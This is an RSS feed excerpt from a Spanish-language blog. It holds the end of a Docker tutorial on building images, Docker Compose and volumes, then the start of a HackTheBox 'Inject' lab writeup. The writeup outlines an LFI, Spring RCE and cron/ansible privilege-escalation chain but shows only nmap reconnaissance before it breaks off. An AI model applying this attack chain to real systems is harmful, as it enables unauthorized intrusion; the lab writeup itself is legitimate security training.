&lt;p&gt;Por lo tanto debemos de cambiar en nuestro codigo del aplicativo y en vez de &lt;code&gt;localhost&lt;/code&gt; indicarle el nombre del contenedor de mongo que llamaremos &lt;code&gt;mongo_connect&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker63.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;docker-build&quot;&gt;Docker build &lt;a href=&quot;#docker-build&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;Vamos a proceder a crear nuestra imagen con el comando &lt;code&gt;docker build&lt;/code&gt; el cual nos permitira crear una imagen basadas en un archivo docker file.&lt;/p&gt;

&lt;p&gt;Este comando recibe dos argumentos, &lt;code&gt;docker build -t nombre_imagen:tag ruta_dockerfile&lt;/code&gt;, donde en &lt;code&gt;tag&lt;/code&gt; podemos hace referencia a la versión que tendra nuestro proyecto.&lt;/p&gt;

&lt;p&gt;Ejecutamos el comando y vemos como se crea nuestra imagen.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker61.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si ahora volvemos a listar nuestras imagenes observamos que ahora tenemos una nueva correspondiente a &lt;code&gt;node&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker62.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Como ultimo paso ahora debemos de volver a crear nuestros contenedores y especificarles que estos ahora formaran parte de una red, para ello primero vamos a borrar el contenedor que previamente creamos.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker64.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Y ahora vamos a usar los mismo comandos para crear el contenedor, solo que esta vez adicionaremos un nuevo parametro &lt;code&gt;--network nombre_red&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker65.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Del mismo modo crearemos el contenedor de nuestra aplicación alojada en la imagen que creamos.&lt;/p&gt;

&lt;p&gt;Ojo debemos especificar tambien con &lt;code&gt;-p&lt;/code&gt; el puerto ya que vamos a acceder de nuestro equipo, ademas de la red y la iamgen tal cual con el tag que proporcionamos.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker66.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Iniciamos ambos contenedores y ahora se encuentran activos.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker67.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nos dirigimos a nuestro navegador para hacer las pruebas respectivas y vemos que genial nuestro aplicativo corre sin problemas.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker68.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vamos a crear un estudiante ahora con la ayuda de &lt;code&gt;curl&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker69.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Listamos nuevamente los datos en nuesntro navegador.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker70.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos que se ejecuta todo correctamente y asi es como pudimos meter nuestra aplicacion en un contenedor y conectarla con otro.&lt;/p&gt;

&lt;h3 id=&quot;docker-compose&quot;&gt;Docker Compose &lt;a href=&quot;#docker-compose&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;Es una herramienta que permite definir y administrar aplicaciones Docker multi-contenedor. Con Docker Compose, puedes describir toda la configuración de tu aplicación, incluidos los servicios, las redes y los volúmenes que necesita, en un archivo de configuración YAML.&lt;/p&gt;

&lt;p&gt;En pocas palabras esto nos va a ahorrar el proceso que hicimos anteriormente para conectar nuestros contenedores que en si fueron muchos pasos y con &lt;code&gt;docker compose&lt;/code&gt; podemos automatizarlo todo.&lt;/p&gt;

&lt;p&gt;Para usar esto, debemos de crear un archivo yaml de nombre &lt;code&gt;docker-compose.yml&lt;/code&gt;.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;YAML: Es un formato de serialización de datos legible por humanos. Fue diseñado para ser un lenguaje simple y fácil de entender que permite representar datos estructurados de manera concisa y clara. YAML se utiliza ampliamente como un formato de configuración, especialmente en el contexto de herramientas y aplicaciones de desarrollo y despliegue, como Docker Compose, Kubernetes, Ansible y muchas otras.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Dentro de este archivo le indicaremos primero la versión que usaremos, en este caso &lt;code&gt;version: &quot;3.9&quot;&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-yml&quot;&gt;version: &quot;3.9&quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Despues en services indicaremos el nombre de los contenedores que vamos a asignar a los contenedores a usar.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-yml&quot;&gt;version: &quot;3.9&quot;
services:
  nodeApp:
  mongo_connect:
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Dentro de cada nombre indicaremos con &lt;code&gt;build ruta_dockerfile&lt;/code&gt;, puertos a mapear &lt;code&gt;ports puerto_hosts:puerto_contenedor&lt;/code&gt; y el nombre del contenedor que usara el servicio de &lt;code&gt;nodeApp&lt;/code&gt; &lt;code&gt;links nombre_contenedor_usa_servicio&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-yml&quot;&gt;version: &quot;3.9&quot;
services:
  nodeApp:
    build: .
    ports:
      - &quot;3000:3000&quot;
    links:
      - mongo_connect
  mongo_connect:
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;De la misma manera similar para el otro contenedor, solo que en este caso especificaremos la imagen en la que se basara &lt;code&gt;image: mongo&lt;/code&gt; la cual ya teniamos descargada y le indicaremos las variables de entorno que necesitamos &lt;code&gt;environment&lt;/code&gt; las cuales antes establecimos para conectarnos.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-yml&quot;&gt;version: &quot;3.9&quot;
services:
  nodeapp:
    build: .
    ports:
      - &quot;3000:3000&quot;
    links:
      - mongo_connect
  mongo_connect:
    image: mongo
    ports:
      - &quot;27017:27017&quot;
    environment:
      - MONGO_INITDB_ROOT_USERNAME=firtsmiracle
      - MONGO_INITDB_ROOT_PASSWORD=firtsmiracle123
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Listo ahora guardamos nuestro archivo, pero recordemos que tenemos dos contenedores activos de cuando realizamos la conexión, por ello primero vamos a pararlos.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker71.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ya que todo esta listo ejecutamos &lt;code&gt;docker-compose up&lt;/code&gt; y esto se encargara de construir nuestros contenedores.&lt;/p&gt;

&lt;p&gt;En versiones mas recientes ejecutar &lt;code&gt;docker compose up&lt;/code&gt; es exactamente lo mismo.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker72.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos que este comando nos automatiza todo el proceso completo y si ahora verificamos si se esta ejecutando el servicio y este se encuentra funcionando correctamente.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker73.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Igual podemos realizar peticiones o listar nuevamente y todo funciona de maravilla.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker74.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker75.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si ahora queremos detener la ejecución, como casi clasicamente hacemos usando las teclas &lt;code&gt;ctrl_c&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker76.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Podemos listar las imagenes que tenemos y observamos una nueva que fue creada ejecutamos &lt;code&gt;docker compose&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker77.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;y del mismo modo si listamos los contenedores, tambien vemos dos nuevos los cuales tambien se crearon al ejecutar el comando.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker78.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Pero esto no acaba aqui, ya que asi como &lt;code&gt;docker compose&lt;/code&gt; nos automatiza la creación, tambien podemos eliminar absolutamente todo, tanto los contenedores que creo como la red que se crea por default de manera automatica.&lt;/p&gt;

&lt;p&gt;Y este comando es &lt;code&gt;docker compose down&lt;/code&gt; o en versiones antiguas &lt;code&gt;docker-compose down&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker79.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Listamos nuevamente los contenedores y estos ya no se encuentran.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker80.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Asi pudimos aprender lo maravilloso que es &lt;code&gt;docker compose&lt;/code&gt; y como este nos simplifica todo el proceso.&lt;/p&gt;

&lt;h3 id=&quot;volumenes&quot;&gt;Volumenes &lt;a href=&quot;#volumenes&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;Generalmente cuando estamos trabajando con contenedores, al eliminarlos estos se borran en conjunto con todos los datos que este contiene. Ya sea cuando estamos creando alguna aplicación que constantemente vamos a estar actualizando, seria muy tedioso estar creando una imagen cada vez que hagamos un cambio.&lt;/p&gt;

&lt;p&gt;Pero si queremos que a pesar de que cuando eliminemos nuestro contenedor, toda nuestra data permanezca intacta y de la misma manera si vamos a estar desarrollando alguna aplicación evitar el fastidio de estar constantemente creando una imagen. Pues docker tiene una solución a esto y es a traves de los &lt;code&gt;Volumenes&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Con los volumenes los que hacemos es que una parte de los archivos que va a tener nuestro contenedor, podemos montarla en nuestro propio sistema principal. Por ello al encotrarse en nuestro sistema hosts no van a eliminarse.&lt;/p&gt;

&lt;p&gt;Esto nos sirve un monton si vamos a trabajar con &lt;code&gt;base de datos&lt;/code&gt; o cuando estamos desarrollando algun sistema.&lt;/p&gt;

&lt;p&gt;Existen tres tipos de maneras de poder crear nuestro volumenes y podemos usaarlos segun lo veamos conveniente.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Anonimo: Indicamos la ruta de lo que queremos almacenar en un volumen y docker se encarga de montarlo en donde lo vea conveniente. Y otro punto es que no vamos a poder referenciar nuestro volumen para que otro contenedor que creemos lo pueda usar.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Anfitrion: En este caso nosotros podemos decidir la ruta de donde se va almacenar nuestro volumen.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Nombrado: Es muy parecido al volumen anonimo, solo que este tiene una mejora y es que si vamos a poder referenciar nuestro volumen, lo que nos ayudara a poder reutilizarlo.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Bien para poder usar los volumenes, debemos a volver a abrirnos nuestro archivo previamente creado &lt;code&gt;docker-compose.yml&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Vamos a agregar la etiqueta &lt;code&gt;volumes&lt;/code&gt; y le asignaremos el nombre del volumen que queremos darle en nuestro caso &lt;code&gt;db-mongo&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-yml&quot;&gt;version: &quot;3.9&quot;
services:
  nodeapp:
    build: .
    ports:
      - &quot;3000:3000&quot;
    links:
      - mongo_connect
  mongo_connect:
    image: mongo
    ports:
      - &quot;27017:27017&quot;
    environment:
      - MONGO_INITDB_ROOT_USERNAME=firtsmiracle
      - MONGO_INITDB_ROOT_PASSWORD=firtsmiracle123
  volumes:
    db-mongo:
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;De la misma manera agregaremos otra etiqueta &lt;code&gt;volumes&lt;/code&gt; dentro del nombre de nuestro contenedor, donde le indicaremos que volumen va a utilizar, en este caso &lt;code&gt;db_mongo&lt;/code&gt; especificando la ruta en donde por defecto mongo guarda los datos &lt;code&gt;/data/db&lt;/code&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;En caso de que estemos trabajando con una base de datos relacional como mysql, la ruta cambiaria y seria /var/lib/mysql, lo mismo para cualquier gestor de base de datos ya que debemos especificar segun de cual estemos haciendo uso la ruta por defecto donde se almacena la data.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code class=&quot;language-yml&quot;&gt;version: &quot;3.9&quot;
services:
  nodeapp:
    build: .
    ports:
      - &quot;3000:3000&quot;
    links:
      - mongo_connect
  mongo_connect:
    image: mongo
    ports:
      - &quot;27017:27017&quot;
    environment:
      - MONGO_INITDB_ROOT_USERNAME=firtsmiracle
      - MONGO_INITDB_ROOT_PASSWORD=firtsmiracle123
    volumes:
      - db-mongo:/data/db
  volumes:
    db-mongo:
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Guardamos nuestro archivo y igual que anteriormente ejecutamos &lt;code&gt;docker compose up&lt;/code&gt;, se desplegan nuestros contenedores.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker81.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vamos a realizar nuevamente algunas peticiones a nuestro aplicativo.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker82.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Verificamos que los datos se insertaron correctamente.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker83.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora para validar que nuestro &lt;code&gt;volumen&lt;/code&gt; es funcional, vamos a eliminar los contenedores y volveremos a levantar otros nuevos con &lt;code&gt;docker compose&lt;/code&gt; y en consecuencia pese a que borramos los primeros con los que interactuamos realizando las peticiones, al desplegar los nuevos podremos seguir trabajando con los mismos datos.&lt;/p&gt;

&lt;p&gt;Entonces primero detenemos la ejecución y eliminamos los contenedores.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker84.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora vamos a levantar nuevamente otros dos nuevos contenedores.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker85.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Finalmente validemos en nuestro navegador si los datos que insetamos antes siguen almancenado y…&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker86.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Genial todo funciona correctamente y de esta manera vemos el impacto que se tiene al usar los &lt;code&gt;volumenes&lt;/code&gt; para tener una persistencia de datos en el tiempo.&lt;/p&gt;

&lt;p&gt;Pero esto no acaba aqui, ya que tambien como mencionaba antes los volumenes tambien nos ayudan en el desarrollo de nuestras aplicaciones.&lt;/p&gt;

&lt;p&gt;Para ello primero necesitaremos crear un nuevo archivo &lt;code&gt;Dockerfile.dev&lt;/code&gt; donde colocaremos todo lo que necesitaremos para el desarrollo, donde vamos a tener un contenido similar a la de nuestro primer dockerfile, pero con algunas variaciones que vamos a ver a continuación.&lt;/p&gt;

&lt;p&gt;Si anteriomente has trabajado con &lt;code&gt;Node&lt;/code&gt;, debes de haber utilizado una herramienta que nos permite detectar los cambios que vamos realizando y esta es &lt;code&gt;nodemon&lt;/code&gt;, asi que vamos a usar un comando el cual va a instalarlo.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;FROM node:18
RUN npm i -g nodemon
RUN mkdir -p /home/myapp

WORKDIR /home/app

COPY . /home/app
EXPOSE 3000
CMD [&quot;node&quot;, &quot;/home/myapp/index.js&quot;]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Tambien vamos a necesitar indicarle la ruta en la cual vamos a estar trabajando y eso lo hacemos con el comando &lt;code&gt;WORKDIR&lt;/code&gt; y por lo tanto en &lt;code&gt;CMD&lt;/code&gt; eliminaremos la ruta completa y pasaremos a usar &lt;code&gt;nodemon&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;FROM node:18

RUN npm i -g nodemon
RUN mkdir -p /home/myapp

WORKDIR /home/myapp

EXPOSE 3000

CMD [&quot;nodemon&quot;, &quot;index.js&quot;]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Bueno, ya que vamos a usar un volumen que se encargara de crear un enlace entre el codigo de nuestra aplicación y la ruta &lt;code&gt;/home/myapp&lt;/code&gt;, no necesitamos mas el comando copy.&lt;/p&gt;

&lt;p&gt;y a continuación ahora debemos de crear tambien un nuevo archivo de &lt;code&gt;docker-compose-fordev.yml&lt;/code&gt; pero vamos a varias un poco el contenido.&lt;/p&gt;

&lt;p&gt;Primero, vamos a añadir la etiqueta &lt;code&gt;context&lt;/code&gt; indicandole la ruta de la aplicación y ponemos un punto ya que es la ruta actual, despues indicamos con la etiqueta &lt;code&gt;dockerfile&lt;/code&gt; el archivo dockerfile que ultilizara para crear el contenedor &lt;code&gt;nodeapp&lt;/code&gt;.
y finalmente añadimos un nuevo volumen dentro del &lt;code&gt;nodeapp&lt;/code&gt; especificando la ruta que sera montada y despues la ruta del contenedor.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-yml&quot;&gt;version: &quot;3.9&quot;
services:
  nodeapp:
    build:
      context: .
      dockerfile: Dockerfile.dev
    ports:
      - &quot;3000:3000&quot;
    links:
      - mongo_connect
    volumes:
      - .:/home/myapp
  mongo_connect:
    image: mongo
    ports:
      - &quot;27017:27017&quot;
    environment:
      - MONGO_INITDB_ROOT_USERNAME=firtsmiracle
      - MONGO_INITDB_ROOT_PASSWORD=firtsmiracle123
    volumes:
      - db-mongo:/data/db
  volumes:
    db-mongo:
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ya que tenemos el archivo listo lo guardamos y ejecutamos nuestro comando &lt;code&gt;docker compose&lt;/code&gt; pero esta vez añadiremos el parametro &lt;code&gt;-f&lt;/code&gt; donde le indicaremos el archivo de docker compose personalizado que en nuestro caso seria este que recien creamos &lt;code&gt;docker-compose-fordev.yml&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker87.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora vemos en nuestro navegador que al igual que antes tenemos los datos que previamente creamos.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker88.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora vamos a añadir en nuestro codigo una linea en consola para que cuando listemos los estudiantes nos muestre un mensaje &lt;code&gt;Listando todos los estudiantes&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker89.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora simplemente al guardar los cambios, automaticamente vemos el cambio reflejado gracias a &lt;code&gt;nodemon&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker90.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Pero vamos a validarlo como se debe y vamos a hacer que se ejecute el console que modificamos cuando recargamos la pagina , depaso tambien insertaremos un nuevo registro solo para probar.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker91.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Recargamos el navegador.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker92.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Toca la prueba de fuego, volvemos a revisar los logs y mira lo que encontramos.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker93.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Asi podemos tener un ambiente de desarrollo al usar &lt;code&gt;docker compose&lt;/code&gt; y aprendimos a usar esta grandiosa herramienta.&lt;/p&gt;

&lt;p&gt;Si te percataste falta algo importante que seguro te estas preguntando, y es la siguiente..&lt;/p&gt;

&lt;p&gt;Genial ya se como crear mis volumenes en docker pero y estos donde se almacenan por si quiero trabajar sobre estos?&lt;/p&gt;

&lt;p&gt;Pues bueno si estas en &lt;code&gt;linux&lt;/code&gt; solo debes dirigirte a la ruta &lt;code&gt;/var/lib/docker/volumes&lt;/code&gt;. y indicar el nombre del volumen.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker93.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Y ahora si estas usando &lt;code&gt;Mac OS&lt;/code&gt; o &lt;code&gt;Windows&lt;/code&gt;, basta con abrir &lt;code&gt;docker desktop&lt;/code&gt; y dirirte a la sección &lt;code&gt;Volumes&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Y bueno esto seria todo por esta oportunidad, espero haberte ayudado a comprender el funcionamiento de esta grandiosa herramienta y ahora si debes ponerte manos a la obra con los contenedores ya que ahora tienes un nuevo superpoder por que ahora dominas &lt;code&gt;Docker&lt;/code&gt;. 😎&lt;/p&gt;

&lt;p&gt;Hasta la proxima! 😄😊.&lt;/p&gt;
</description>
        <pubDate>Sat, 22 Jul 2023 00:00:00 -0500</pubDate>
        <link>http://localhost:4000/articulos/Docker</link>
        <guid isPermaLink="true">http://localhost:4000/articulos/Docker</guid>
        
        <category>Docker</category>
        
        <category>Contenedor</category>
        
        <category>DockerHub</category>
        
        
        <category>articulos</category>
        
      </item>
    
      <item>
        <title>Maquina Inject - htb writeup</title>
        <description>&lt;p&gt;El dia de hoy vamos a resolver &lt;code&gt;Inject&lt;/code&gt; de &lt;code&gt;hackthebox&lt;/code&gt; una maquina &lt;code&gt;linux&lt;/code&gt; de dificultad facil, para explotar esta maquina vamos a aprovecharnos de una ruta de subida de archivos donde existe un &lt;code&gt;LFI&lt;/code&gt; y a traves de este podrenmos obtener acceso a archivos con credenciales y información para la explotación de una versión de &lt;code&gt;spring framework&lt;/code&gt; que nos otorgara &lt;code&gt;RCE&lt;/code&gt; y finalmente para elevar nuestros privilegios abusaremos de una &lt;code&gt;cron job&lt;/code&gt; para crearnos un archivo malicioso &lt;code&gt;ansible playbook&lt;/code&gt;, manipulando los permisos de la &lt;code&gt;bash&lt;/code&gt; y asi convertirnos en el usuario &lt;code&gt;root&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Maquina curiosa asi que vamos a darle!.&lt;/p&gt;

&lt;p&gt;Vamos a comenzar como de costumbre creando un directorio con el nombre de la maquina:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir Inject
❯ ls

 Inject
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ which mkt
mkt () {
	mkdir {nmap,content,exploits,scripts}
}
❯ mkt
❯ ls
 content   exploits   nmap   scripts
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;enumeracion&quot;&gt;ENUMERACION &lt;a href=&quot;#enumeracion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Comenzaremos con la fase de Enumeracion, mandando una traza a la ip de la maquina victima con el comando &lt;code&gt;ping&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ping -c 1 10.10.11.204
PING 10.10.11.204 (10.10.11.204) 56(84) bytes of data.
64 bytes from 10.10.11.204: icmp_seq=1 ttl=63 time=125 ms

--- 10.10.11.204 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 124.537/124.537/124.537/0.000 ms
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Vemos que la maquina nos responde, con un ttl de &lt;code&gt;63&lt;/code&gt; y por proximidad seria correspondiente a una maquina &lt;code&gt;linux&lt;/code&gt;.&lt;/p&gt;

&lt;h3 id=&quot;escaneo-de-puertos&quot;&gt;ESCANEO DE PUERTOS&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Parámetro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Descripción&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-p-&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Escaneamos todos los 65535 puertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;–open&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que estén abiertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-v&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando (verbose).&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-oG&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para que mediante una funcion de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre &lt;code&gt;openPorts&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.204 -oG openPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-07-19 18:09 GMT
Initiating SYN Stealth Scan at 18:09
Scanning 10.10.11.204 [65535 ports]
Discovered open port 8080/tcp on 10.10.11.204
Discovered open port 22/tcp on 10.10.11.204
Completed SYN Stealth Scan at 18:09, 15.98s elapsed (65535 total ports)
Nmap scan report for 10.10.11.204
Host is up, received user-set (0.13s latency).
Scanned at 2023-07-19 18:09:29 GMT for 16s
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 63
8080/tcp open  http-proxy syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 16.10 seconds
           Raw packets sent: 78704 (3.463MB) | Rcvd: 78677 (3.147MB)
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;escaneo-de-version-y-servicios&quot;&gt;ESCANEO DE VERSION Y SERVICIOS&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -sCV -p22,8080 10.10.11.204 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2023-07-19 18:10 GMT
Nmap scan report for 10.10.11.204
Host is up (0.15s latency).

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
